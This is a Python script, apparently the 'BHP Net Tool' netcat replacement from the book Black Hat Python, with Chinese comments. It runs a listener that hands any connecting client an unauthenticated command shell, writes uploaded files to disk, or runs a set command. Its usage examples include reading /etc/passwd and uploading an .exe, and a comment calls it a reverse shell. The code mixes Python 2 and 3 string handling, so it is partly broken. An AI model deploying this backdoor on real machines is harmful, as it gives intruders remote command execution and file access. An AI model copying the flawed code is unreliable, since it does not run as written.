#!/usr/bin/python
#-*- coding:utf8 -*-

import sys
import socket
import getopt
import threading
import subprocess

# 定义一些全局变量
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def run_command(command):

    command = command.rstrip()# 删除字符串末尾的空格
    # 运行命令并将输出放回
    try:#执行shell命令 返回结果
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        #该函数两个参数第一个表示命令内容，因为中间有空格所以用中括号这种形式，
        #同时制定shell=False表示命令分开写了。而该命令执行后的输出内容会返回给output变量。
        #需要注意的是这个output变量并不是一个string，也就是说不能用string的一些函数，
        # 比如你想知道返回的输出中是否包含某个字符串,必须先对对象进行.decode()
    except:
        output = "Failed to execute command.\r\n"
    # 将输出发送
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command


    if len(upload_destination):# 检查上传文件
        # 读取所有的字符并写下目标
        file_buffer = ""
        while True:# 持续读取数据直到没有符合的数据
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, "wb")#对文件进行二进制写操作
            file_descriptor.write(file_buffer)#将file_buffer写入到文件里
            file_descriptor.close()

            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # 检查命令执行
    if len(execute):
        # 运行命令
        output = run_command(execute)
        client_socket.send(output)


    # 如果需要一个命令行shell,那么我们进入另一个循环
    if command:
        while True:
            # 跳出一个窗口
            client_socket.send("<BHP:#>")

            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            #  返回命令输出
            response = run_command(cmd_buffer)
            # 返回响应数据
            client_socket.send(response)

def server_loop():
    global target

    # 如果没有定义目标,那我们监听所有接口
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        # 分拆一个线程处理新的客户端
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 连接到目标主机
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)

        while True:# 现在等待数据回传
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print  (response)

            # 等待更多的输入
            #buffer = raw_input("")
            buffer = input("")
            buffer += "\n"

            # 发送出去
            client.send(buffer)

    except:
        print ("[*] Exception! Exiting.")

    #关闭连接
    client.close()

def usage():
    print("BHP Net Tool" )
    print("\n")
    print ("Usage: replacenetcat.py -t target_host - p port")#使用方法
    print ("-l --listen              - listen on [host]:[port] for incoming connections")
    print ("-e --execute=file_to_run -execute the given file upon receiving a connection")
    print ("-c --command             - initialize a commandshell")
    print ("-u --upload=destination  - upon receiving connection upload a file and write to [destination]")
    print("\n")
    print("\n")
    print ("Examples:")
    print ("replacenetcat.py -t 192.168.0.1 -p 5555 -l -c")
    print ("replacenetcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print ("replacenetcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print ("echo 'ABCDEFGHI' | python ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not  len(sys.argv[1:]):
        usage()

    try:# 读取命令行选项,若没有该选项则显示用法
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print (str(err))
        usage()


    for o,a in opts:#进入相对应的功能模块
        if o in ("-h","--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"

    if not listen and len(target) and port > 0:#我们是进行监听还是仅从标准输入读取数据并发送数据？

        # 从命令行读取内存数据
        # 这里将阻塞,所以不再向标准输入发送数据时发送CTRL-D
        buffer = sys.stdin.read()
        client_sender(buffer)# 发送数据

    # 我们开始监听并准备上传文件,执行命令
    # 放置一个反弹shell
    # 取决于上面的命令行选项
    if listen:
        server_loop()

#调用main函数
if __name__ == "__main__":
    main()